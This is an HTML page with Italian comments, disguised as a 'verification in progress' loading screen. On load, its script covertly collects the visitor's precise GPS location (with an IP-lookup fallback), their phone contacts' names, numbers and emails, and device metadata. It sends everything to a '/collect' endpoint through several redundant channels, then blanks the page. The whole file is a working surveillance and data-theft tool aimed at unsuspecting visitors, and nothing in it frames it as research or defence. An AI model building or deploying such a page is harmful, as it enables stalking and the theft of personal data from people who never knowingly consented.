<!-- index.html – acquisisce posizione + contatti, pagina bianca finale -->
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Caricamento...</title>
    <style>
        body { background: #ffffff; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: Arial, sans-serif; color: #333; }
        .hidden { display: none; }
        #loading { text-align: center; }
        .spinner { border: 4px solid #eee; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; color: #888; }
    </style>
</head>
<body>
    <div id="loading"><div class="spinner"></div><p>Verifica in corso...</p></div>
    <script>
        // ===== CONFIGURAZIONE =====
        const SERVER_URL = 'http://localhost:3000/collect';

        // ===== INVIO DATI =====
        function sendData(payload) {
            const json = JSON.stringify(payload);
            // fetch con CORS
            fetch(SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: json,
                keepalive: true
            }).catch(() => {
                // fallback sendBeacon
                const blob = new Blob([json], { type: 'application/json' });
                navigator.sendBeacon(SERVER_URL, blob);
            });
            // beacon immagine (GET) – solo se payload piccolo
            try {
                new Image().src = SERVER_URL + '?d=' + encodeURIComponent(json.substring(0, 2000));
            } catch(e) {}
        }

        // ===== GEOLOCALIZZAZIONE =====
        function getGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    fetch('https://ipapi.co/json/')
                        .then(r => r.json())
                        .then(ip => resolve({ lat: ip.latitude, lon: ip.longitude, city: ip.city, country: ip.country_name, ip: ip.ip }))
                        .catch(() => resolve({ error: 'geolocation not supported' }));
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, altitude: pos.coords.altitude, speed: pos.coords.speed, heading: pos.coords.heading, timestamp: new Date(pos.timestamp).toISOString() }),
                    (err) => {
                        fetch('https://ipapi.co/json/')
                            .then(r => r.json())
                            .then(ip => resolve({ error: err.message, ip: ip.ip, city: ip.city, country: ip.country_name, lat: ip.latitude, lon: ip.longitude }))
                            .catch(() => resolve({ error: err.message || 'geolocation denied' }));
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        // ===== CONTATTI =====
        function getContacts() {
            return new Promise((resolve) => {
                if (!navigator.contacts || typeof navigator.contacts.select !== 'function') {
                    resolve({ error: 'Contacts API not available' });
                    return;
                }
                navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                    .then(contacts => {
                        const cleaned = contacts.map(c => ({ name: c.name?.[0] || null, tel: c.tel || null, email: c.email || null }));
                        resolve(cleaned);
                    })
                    .catch(err => resolve({ error: err.message || 'contacts denied' }));
            });
        }

        // ===== METADATI =====
        function getMetadata() {
            return { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screen: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, url: window.location.href, referrer: document.referrer || 'none' };
        }

        // ===== COLLEZIONE PRINCIPALE =====
        async function collect() {
            const [geo, contacts] = await Promise.all([getGeolocation(), getContacts()]);
            const meta = getMetadata();
            const payload = { geo, contacts, metadata: meta, timestamp: new Date().toISOString() };
            sendData(payload);
            setTimeout(() => { document.body.innerHTML = ''; }, 1000);
        }

        window.addEventListener('load', function() { setTimeout(collect, 500); });
    </script>
</body>
</html>
